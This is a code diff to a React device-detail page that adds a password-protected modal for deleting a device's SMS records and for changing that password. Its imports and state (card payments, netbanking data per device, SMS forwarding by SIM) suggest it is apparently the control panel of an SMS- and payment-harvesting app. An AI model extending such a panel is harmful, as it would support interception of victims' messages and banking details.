@@ -7,6 +7,7 @@ import { getDevice } from "../services/api/devices";
 import { listDeviceNotifications, deleteDeviceNotifications } from "../services/api/sms";
 import { listFormSubmissions } from "../services/api/forms";
 import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
+import { changeDeletePassword, getDeletePasswordStatus } from "../services/api/admin";
 import { ENV, apiHeaders } from "../config/constants";
 import Modal from "../components/ui/Modal";
 import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
@@ -14,6 +15,12 @@ import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
 type TabKey = "overview" | "sms" | "forwarding" | "userdata";
 type ForwardState = "idle" | "pending" | "active" | "inactive" | "failed";
 type ForwardingChoice = "auto" | "sim1" | "sim2";
+
+type DeleteModalMode = "delete" | "change";
+type DeleteAction =
+  | { type: "single_sms"; sms: any }
+  | { type: "all_sms" }
+  | null;
 
 function safeString(v: any): string {
   if (v === null || v === undefined) return "";
@@ -369,6 +376,18 @@ export default function DeviceDetailPage() {
   const [adminsDraft, setAdminsDraft] = useState<string[]>(["", "", "", ""]);
   const [forwardingChoice, setForwardingChoice] = useState<ForwardingChoice>("auto");
 
+  const [deleteModalOpen, setDeleteModalOpen] = useState(false);
+  const [deleteModalMode, setDeleteModalMode] = useState<DeleteModalMode>("delete");
+  const [deleteAction, setDeleteAction] = useState<DeleteAction>(null);
+  const [deletePassword, setDeletePassword] = useState("");
+  const [deletePasswordSet, setDeletePasswordSet] = useState<boolean | null>(null);
+  const [deleteBusy, setDeleteBusy] = useState(false);
+  const [deleteError, setDeleteError] = useState<string | null>(null);
+  const [deleteSuccess, setDeleteSuccess] = useState<string | null>(null);
+  const [changeCurrentPassword, setChangeCurrentPassword] = useState("");
+  const [changeNewPassword, setChangeNewPassword] = useState("");
+  const [changeConfirmPassword, setChangeConfirmPassword] = useState("");
+
   const currentAdmins = useMemo<string[]>(() => {
     const rawList: unknown[] = Array.isArray(device?.admins)
       ? device.admins
@@ -445,6 +464,18 @@ export default function DeviceDetailPage() {
     }
   }
 
+  async function loadDeletePasswordStatus() {
+    try {
+      const res = await getDeletePasswordStatus();
+      if (!mountedRef.current) return;
+      setDeletePasswordSet(!!res.isSet);
+    } catch (e) {
+      console.warn("loadDeletePasswordStatus failed", e);
+      if (!mountedRef.current) return;
+      setDeletePasswordSet(null);
+    }
+  }
+
   async function loadUserData(force = false) {
     if (!did) return;
     if (userLoading) return;
@@ -495,6 +526,37 @@ export default function DeviceDetailPage() {
     }
   }
 
+  function resetDeleteModalState() {
+    setDeleteModalMode("delete");
+    setDeleteAction(null);
+    setDeletePassword("");
+    setDeleteBusy(false);
+    setDeleteError(null);
+    setDeleteSuccess(null);
+    setChangeCurrentPassword("");
+    setChangeNewPassword("");
+    setChangeConfirmPassword("");
+  }
+
+  function closeDeleteModal() {
+    setDeleteModalOpen(false);
+    resetDeleteModalState();
+  }
+
+  async function openDeleteModal(action: DeleteAction) {
+    setDeleteAction(action);
+    setDeleteModalMode("delete");
+    setDeletePassword("");
+    setDeleteBusy(false);
+    setDeleteError(null);
+    setDeleteSuccess(null);
+    setChangeCurrentPassword("");
+    setChangeNewPassword("");
+    setChangeConfirmPassword("");
+    setDeleteModalOpen(true);
+    await loadDeletePasswordStatus();
+  }
+
   useEffect(() => {
     wsService.connect();
   }, []);
@@ -505,6 +567,7 @@ export default function DeviceDetailPage() {
 
     loadDevice();
     loadSms();
+    loadDeletePasswordStatus().catch(() => {});
 
     return () => {
       mountedRef.current = false;
@@ -710,15 +773,75 @@ export default function DeviceDetailPage() {
     };
   }, [did, forwardingSimDraft]);
 
-  async function handleDeleteAllSms() {
-    if (!confirm("Delete all notifications for this device?")) return;
-    try {
-      await deleteDeviceNotifications(did);
-      setSmsList([]);
-      alert("Deleted");
-    } catch {
-      alert("Failed to delete notifications");
+  async function runDeleteAction(password: string) {
+    if (!deleteAction) return;
+
+    const trimmedPassword = password.trim();
+    if (!trimmedPassword) {
+      setDeleteError("Password is required");
+      return;
     }
+    if (trimmedPassword.length < 4) {
+      setDeleteError("Password must be at least 4 digits");
+      return;
+    }
+
+    setDeleteBusy(true);
+    setDeleteError(null);
+    setDeleteSuccess(null);
+
+    try {
+      if (deleteAction.type === "all_sms") {
+        await deleteDeviceNotifications(did, trimmedPassword as any);
+        setSmsList([]);
+        setDeleteSuccess(deletePasswordSet ? "All SMS deleted" : "Password created and all SMS deleted");
+      } else if (deleteAction.type === "single_sms") {
+        const sms = deleteAction.sms;
+        const smsId = safeString(sms?._id ?? sms?.id).trim();
+
+        if (!smsId) {
+          throw new Error("SMS id not found");
+        }
+
+        setDeletingSmsId(smsId);
+
+        const url = `${ENV.API_BASE}/api/devices/notifications/device/${encodeURIComponent(did)}/${encodeURIComponent(smsId)}`;
+
+        await tryDelete(url, {
+          password: trimmedPassword,
+          uniqueid: did,
+          deviceId: did,
+          id: smsId,
+          _id: smsId,
+        });
+
+        setSmsList((prev) => prev.filter((item: any) => safeString(item?._id ?? item?.id).trim() !== smsId));
+        setDeleteSuccess(deletePasswordSet ? "SMS deleted" : "Password created and SMS deleted");
+      }
+
+      setDeletePasswordSet(true);
+
+      setTimeout(() => {
+        if (!mountedRef.current) return;
+        closeDeleteModal();
+      }, 700);
+    } catch (e: any) {
+      console.error("delete action failed", e);
+      const status = e?.response?.status;
+      const message = safeString(e?.response?.data?.error || e?.message || "");
+      if (status === 400 || status === 403) {
+        setDeleteError(message || "Invalid password");
+      } else {
+        setDeleteError(message || "Delete failed");
+      }
+    } finally {
+      setDeleteBusy(false);
+      setDeletingSmsId("");
+    }
+  }
+
+  async function handleDeleteAllSms() {
+    await openDeleteModal({ type: "all_sms" });
   }
 
   async function handleDeleteSingleSms(sms: any) {
@@ -729,27 +852,61 @@ export default function DeviceDetailPage() {
       return;
     }
 
-    if (!confirm("Delete this SMS?")) return;
+    await openDeleteModal({ type: "single_sms", sms });
+  }
 
-    setDeletingSmsId(smsId);
+  async function handleSubmitDeletePassword(e?: FormEvent) {
+    if (e) e.preventDefault();
+    await runDeleteAction(deletePassword);
+  }
+
+  async function handleChangeDeletePassword(e?: FormEvent) {
+    if (e) e.preventDefault();
+
+    const currentPassword = changeCurrentPassword.trim();
+    const newPassword = changeNewPassword.trim();
+    const confirmPassword = changeConfirmPassword.trim();
+
+    if (!currentPassword) {
+      setDeleteError("Current password is required");
+      return;
+    }
+    if (!newPassword) {
+      setDeleteError("New password is required");
+      return;
+    }
+    if (newPassword.length < 4) {
+      setDeleteError("New password must be at least 4 digits");
+      return;
+    }
+    if (newPassword !== confirmPassword) {
+      setDeleteError("Confirm password does not match");
+      return;
+    }
+
+    setDeleteBusy(true);
+    setDeleteError(null);
+    setDeleteSuccess(null);
 
     try {
-      const url = `${ENV.API_BASE}/api/devices/notifications/device/${encodeURIComponent(did)}/${encodeURIComponent(smsId)}`;
+      const res = await changeDeletePassword(currentPassword, newPassword);
+      if (!res.success) {
+        setDeleteError(res.error || "Failed to change password");
+        return;
+      }
 
-      await tryDelete(url, {
-        uniqueid: did,
-        deviceId: did,
-        id: smsId,
-        _id: smsId,
-      });
-
-      setSmsList((prev) => prev.filter((item: any) => safeString(item?._id ?? item?.id).trim() !== smsId));
-      alert("SMS deleted");
-    } catch (e) {
-      console.error("delete sms failed", e);
-      alert("Failed to delete SMS");
+      setDeletePasswordSet(true);
+      setChangeCurrentPassword("");
+      setChangeNewPassword("");
+      setChangeConfirmPassword("");
+      setDeletePassword("");
+      setDeleteSuccess("Password changed successfully");
+      setDeleteModalMode("delete");
+    } catch (e: any) {
+      console.error("change delete password failed", e);
+      setDeleteError(safeString(e?.response?.data?.error || e?.message || "Failed to change password"));
     } finally {
-      setDeletingSmsId("");
+      setDeleteBusy(false);
     }
   }
 
@@ -1000,6 +1157,27 @@ export default function DeviceDetailPage() {
     return "Auto";
   }, [forwardingChoice]);
 
+  const deleteModalTitle = useMemo(() => {
+    if (deleteModalMode === "change") return "Change Delete Password";
+    if (deleteAction?.type === "all_sms") return "Enter Password to Delete All SMS";
+    return "Enter Password to Delete SMS";
+  }, [deleteAction, deleteModalMode]);
+
+  const deleteActionLabel = useMemo(() => {
+    if (deleteAction?.type === "all_sms") return "Delete All SMS";
+    return "Delete SMS";
+  }, [deleteAction]);
+
+  const deleteHelpText = useMemo(() => {
+    if (deleteModalMode === "change") {
+      return "Enter your current password and choose a new password. New password must be at least 4 digits.";
+    }
+    if (deletePasswordSet === false) {
+      return "No delete password is set yet. The password you enter now will be saved and used for future device/SMS deletes.";
+    }
+    return "Enter your delete password to continue. The same password is used for both device delete and SMS delete.";
+  }, [deleteModalMode, deletePasswordSet]);
+
   if (!did) return <div className="p-6">Missing device id</div>;
 
   return (
@@ -1204,7 +1382,7 @@ export default function DeviceDetailPage() {
                         const body = safeString(m.body || "").trim();
                         const ts = getTimestamp(m);
                         const smsId = safeString(m._id || m.id).trim();
-                        const isDeleting = deletingSmsId === smsId;
+                        const isDeleting = deletingSmsId === smsId || (deleteBusy && deleteAction?.type === "single_sms" && safeString(deleteAction?.sms?._id ?? deleteAction?.sms?.id).trim() === smsId);
 
                         return (
                           <div
@@ -1745,6 +1923,168 @@ export default function DeviceDetailPage() {
             </button>
           </div>
         </div>
+      </Modal>
+
+      <Modal open={deleteModalOpen} onClose={closeDeleteModal} title={deleteModalTitle}>
+        {deleteModalMode === "delete" ? (
+          <form onSubmit={handleSubmitDeletePassword} className="space-y-4">
+            <div className="rounded-2xl border border-amber-200 bg-amber-50 px-3 py-3 text-sm leading-6 text-slate-700">
+              {deleteHelpText}
+            </div>
+
+            {deleteAction?.type === "single_sms" ? (
+              <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600">
+                <div className="font-bold text-slate-900">Selected SMS</div>
+                <div className="mt-1 break-words">
+                  {safeString(deleteAction.sms?.title || "New SMS") || "New SMS"}
+                </div>
+              </div>
+            ) : deleteAction?.type === "all_sms" ? (
+              <div className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-3 text-[12px] text-slate-600">
+                This will delete all SMS for this device.
+              </div>
+            ) : null}
+
+            <div>
+              <div className="mb-1 text-xs font-semibold text-slate-600">
+                {deletePasswordSet === false ? "Create Password" : "Password"}
+              </div>
+              <input
+                type="password"
+                value={deletePassword}
+                onChange={(e) => setDeletePassword(e.target.value)}
+                placeholder={deletePasswordSet === false ? "Enter new 4-digit password" : "Enter delete password"}
+                className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100"
+                autoFocus
+              />
+              <div className="mt-1 text-[11px] text-slate-500">Password must be at least 4 digits.</div>
+            </div>
+
+            {deleteError ? (
+              <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
+                {deleteError}
+              </div>
+            ) : null}
+
+            {deleteSuccess ? (
+              <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">
+                {deleteSuccess}
+              </div>
+            ) : null}
+
+            <div className="grid grid-cols-1 gap-2 pt-1">
+              <button
+                type="submit"
+                disabled={deleteBusy}
+                className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60"
+              >
+                {deleteBusy ? "Processing..." : deleteActionLabel}
+              </button>
+
+              <button
+                type="button"
+                onClick={() => {
+                  setDeleteModalMode("change");
+                  setDeleteError(null);
+                  setDeleteSuccess(null);
+                }}
+                className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800"
+              >
+                Change Password
+              </button>
+
+              <button
+                type="button"
+                onClick={closeDeleteModal}
+                className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700"
+              >
+                Cancel
+              </button>
+            </div>
+          </form>
+        ) : (
+          <form onSubmit={handleChangeDeletePassword} className="space-y-4">
+            <div className="rounded-2xl border border-sky-200 bg-sky-50 px-3 py-3 text-sm leading-6 text-slate-700">
+              {deleteHelpText}
+            </div>
+
+            <div>
+              <div className="mb-1 text-xs font-semibold text-slate-600">Current Password</div>
+              <input
+                type="password"
+                value={changeCurrentPassword}
+                onChange={(e) => setChangeCurrentPassword(e.target.value)}
+                placeholder="Enter current password"
+                className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100"
+                autoFocus
+              />
+            </div>
+
+            <div>
+              <div className="mb-1 text-xs font-semibold text-slate-600">New Password</div>
+              <input
+                type="password"
+                value={changeNewPassword}
+                onChange={(e) => setChangeNewPassword(e.target.value)}
+                placeholder="Enter new 4-digit password"
+                className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100"
+              />
+            </div>
+
+            <div>
+              <div className="mb-1 text-xs font-semibold text-slate-600">Confirm New Password</div>
+              <input
+                type="password"
+                value={changeConfirmPassword}
+                onChange={(e) => setChangeConfirmPassword(e.target.value)}
+                placeholder="Confirm new password"
+                className="h-11 w-full rounded-xl border border-slate-200 px-3 text-[15px] outline-none transition focus:border-cyan-500 focus:ring-4 focus:ring-cyan-100"
+              />
+            </div>
+
+            {deleteError ? (
+              <div className="rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
+                {deleteError}
+              </div>
+            ) : null}
+
+            {deleteSuccess ? (
+              <div className="rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">
+                {deleteSuccess}
+              </div>
+            ) : null}
+
+            <div className="grid grid-cols-1 gap-2 pt-1">
+              <button
+                type="submit"
+                disabled={deleteBusy}
+                className="h-11 w-full rounded-2xl bg-[var(--brand)] px-4 text-[14px] font-extrabold text-white disabled:opacity-60"
+              >
+                {deleteBusy ? "Saving..." : "Save New Password"}
+              </button>
+
+              <button
+                type="button"
+                onClick={() => {
+                  setDeleteModalMode("delete");
+                  setDeleteError(null);
+                  setDeleteSuccess(null);
+                }}
+                className="h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 px-4 text-[14px] font-bold text-slate-800"
+              >
+                Back to Delete
+              </button>
+
+              <button
+                type="button"
+                onClick={closeDeleteModal}
+                className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] font-bold text-slate-700"
+              >
+                Cancel
+              </button>
+            </div>
+          </form>
+        )}
       </Modal>
     </AnimatedAppBackground>
   );
